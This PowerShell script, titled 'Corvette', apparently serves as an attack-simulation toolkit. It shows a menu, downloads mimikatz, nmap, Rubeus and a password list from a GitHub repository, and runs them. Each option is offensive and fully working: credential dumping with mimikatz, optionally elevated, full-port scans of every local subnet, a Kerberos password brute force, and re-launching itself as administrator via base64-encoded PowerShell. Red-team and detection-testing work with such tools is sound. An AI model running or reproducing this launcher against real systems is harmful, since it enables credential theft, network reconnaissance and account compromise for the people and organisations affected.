
function IsFile ([string]$path) {
    return [IO.File]::Exists($path)
}

function IsDirectory ([string]$path) {
    return ![string]::IsNullOrEmpty($save_as) -And (Test-Path $path) -And ((Get-Item $path) -is [IO.DirectoryInfo])
}

function BuildFullPath ([string]$parent, [string]$child) {
    return [IO.Path]::GetFullPath((Join-Path $parent $child))
}

function ReadAllBytes ([IO.BinaryReader] $reader) {
    $mem = New-Object IO.MemoryStream
    $buf = New-Object byte[] 4096
    $actual = 0
    do {
        $actual = $reader.Read($buf, 0, $buf.Length)
        If ($actual -gt 0) {
            $mem.Write($buf, 0, $actual)
        }
    } While ($actual -ne 0)

    $mem.Close()
    return $mem.ToArray()
}

function DownloadString ([string]$url) {
    return [Net.WebClient]::New().DownloadString($url)
}

function DownloadBytes ([string]$url) {
    $resp = New-Object IO.BinaryReader([Net.HttpWebRequest]::Create($url).GetResponse().GetResponseStream())
    return ReadAllBytes($resp)
}

function DownloadFile ([string]$url, [string]$save_as) {
    $cli = New-Object Net.WebClient
    if ([string]::IsNullOrEmpty($save_as) -Or (IsDirectory $save_as)) {
        $uri = New-Object System.Uri($url)
        if (!$uri.AbsolutePath.EndsWith("/")) {
            $filename = Split-Path $uri.AbsolutePath -Leaf
        } else {
            $filename = "temp.dat"
        }
        if ((IsDirectory $save_as)) {
            $save_as = [IO.Path]::GetFullPath((Join-Path $save_as $filename))
        } else {
            $save_as = $filename
        }
    }
    $cli.DownloadFile($url, $save_as)
    return $save_as
}

function DownloadAndExtractArchive ([string]$url, [string]$directory) {
    $file = DownloadFile $url ([IO.Path]::GetTempPath())
    Expand-Archive -Force $file $directory
    Remove-Item $file
}

class Properties {
    [string]$my_script
    [string]$home_dir

    Properties([System.Management.Automation.InvocationInfo]$info, [string]$home_dir) {
        if ([string]::IsNullOrEmpty($info.MyCommand.Path)) {
            $this.my_script = $info.MyCommand
        } else {
            $this.my_script = [System.IO.File]::ReadAllText($info.MyCommand.Path)
        }
        $this.home_dir = $home_dir
    }
    
    [void]MakeSureHomeDirectoryPathExists() {
        New-Item -ItemType Directory -Force -Path $this.home_dir
    }
}

class Mimikatz {
    [Properties]$props
    [string]$mimikatz_dir
    [string]$mimikatz_exe

    Mimikatz([Properties]$props) {
        $this.props = $props
        $this.mimikatz_dir = BuildFullPath $props.home_dir ".\mimikatz"
        $this.mimikatz_exe = BuildFullPath $this.mimikatz_dir "mimikatz.exe"
        $this.Prepare()
    }

    hidden [void] Prepare() {
        if (!(IsFile $this.mimikatz_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/mimikatz.zip?raw=true"
            DownloadAndExtractArchive $url $this.mimikatz_dir
        }
    }

    [void]Run([bool]$run_as) {
        if ($run_as) {
            Start-Process -FilePath $this.mimikatz_exe -WorkingDirectory $this.props.home_dir -verb runas
        } else {
            Start-Process -FilePath $this.mimikatz_exe -WorkingDirectory $this.props.home_dir
        }
    }
}

class PortScan {
    [string]$nmap_dir
    [string]$nmap_exe

    PortScan([Properties]$props) {
        $this.nmap_dir = BuildFullPath $props.home_dir ".\nmap"
        $this.nmap_exe = BuildFullPath $this.nmap_dir "nmap.exe"
        $this.Prepare()
    }

    hidden [void] Prepare() {
        if (!(IsFile $this.nmap_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/nmap-7.92.zip?raw=true"
            DownloadAndExtractArchive $url $this.nmap_dir
        }
    }

    [void]Run() {
        $subnet_list = Get-NetIPAddress -AddressFamily IPV4 `
                     | select IPAddress, PrefixLength `
                     | % { $_.IPAddress + '/' + $_.PrefixLength }
        foreach ($subnet in $subnet_list) {
            if (!$subnet.StartsWith("127.")) {
                Write-Host "Starting a port scan: $subnet"

                $args = @("-p", "1-65535", $subnet)
                Start-Process -FilePath $this.nmap_exe -ArgumentList $args
            }
        }
    }
}

class KerberosBruteForce {
    [string]$rubeus_dir
    [string]$rubeus_exe
    [string]$passwords_file

    KerberosBruteForce([Properties]$props) {
        $this.rubeus_dir = BuildFullPath $props.home_dir ".\rubeus"
        $this.rubeus_exe = BuildFullPath $this.rubeus_dir "rubeus.exe"
        $this.passwords_file = BuildFullPath $this.rubeus_dir "passwords.txt"
        $this.Prepare()
    }

    hidden [void] Prepare() {
        if (!(IsFile $this.rubeus_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/rubeus.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
        if (!(IsFile $this.passwords_file)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/passwords.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
    }

    [void]Run() {
        $args = @("brute", "/passwords:$($this.passwords_file)", "/noticket")
        Start-Process -FilePath $this.rubeus_exe -ArgumentList $args
    }
}

class Menu {
    [Properties]$props
    
    Menu([Properties]$props) {
        $this.props = $props
    }

    hidden [bool]LaunchUserModeCommand($cmd) {
        switch ($cmd) {
            "0" {
                $script = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($this.props.my_script))
                $args = @("-e", $script)
                Start-Process -FilePath powershell.exe -verb runas -ArgumentList $args
            }
            "1" {
                Start-Process -FilePath cmd.exe -WorkingDirectory $this.props.home_dir
            }
            "2" {
                Start-Process -FilePath powershell.exe -WorkingDirectory $this.props.home_dir
            }
            "3" {
                $args = @("/k cd /d `"$($this.props.home_dir)`"")
                Start-Process -FilePath cmd.exe -verb runas -ArgumentList $args
            }
            "4" {
                $args = @("-NoExit", "-Command", "cd `"" + $this.props.home_dir + "`"")
                Start-Process -FilePath powershell.exe -verb runas -ArgumentList $args
            }
            "5" {
                [Mimikatz]::New($this.props).Run($false)
            }
            "6" {
                [Mimikatz]::New($this.props).Run($true)
            }
            "7" {
                [PortScan]::New($this.props).Run()
            }
            "8" {
                [KerberosBruteForce]::New($this.props).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    hidden [void]OpenUserModeMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 0) Run as administrator"
            Write-Host " 1) Create a new command shell"
            Write-Host " 2) Create a new powershell"
            Write-Host " 3) Create a new command shell (Run as administrator)"
            Write-Host " 4) Create a new powershell (Run as administrator)"
            Write-Host " 5) Run mimikatz"
            Write-Host " 6) Run mimikatz (Run as administrator)"
            Write-Host " 7) Run port scan"
            Write-Host " 8) Run Kerberos Brute Force"

            while (!$this.LaunchUserModeCommand((Read-Host "Please choose a menu item to run"))) {}
        }
    }

    hidden [bool]LaunchAdminModeCommand($cmd) {
        switch ($cmd) {
            "1" {
                Start-Process -FilePath cmd.exe -WorkingDirectory $this.props.home_dir
            }
            "2" {
                Start-Process -FilePath powershell.exe -WorkingDirectory $this.props.home_dir
            }
            "3" {
                [Mimikatz]::New($this.props).Run($false)
            }
            "4" {
                [PortScan]::New($this.props).Run()
            }
            "5" {
                [KerberosBruteForce]::New($this.props).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    hidden [void]OpenAdminModeMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Create a new command shell"
            Write-Host " 2) Create a new powershell"
            Write-Host " 3) Run mimikatz"
            Write-Host " 4) Run port scan"
            Write-Host " 5) Run Kerberos Brute Force"

            while (!$this.LaunchAdminModeCommand((Read-Host "Please choose a menu item to run"))) {}
        }
    }

    [void]OpenMenu() {
        $current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($current.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            $this.OpenAdminModeMenu()
        } else {
            $this.OpenUserModeMenu()
        }
    }
}

$home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"
$props = [Properties]::New($MyInvocation, $home_dir)
$props.MakeSureHomeDirectoryPathExists()

[Menu]::New($props).OpenMenu()
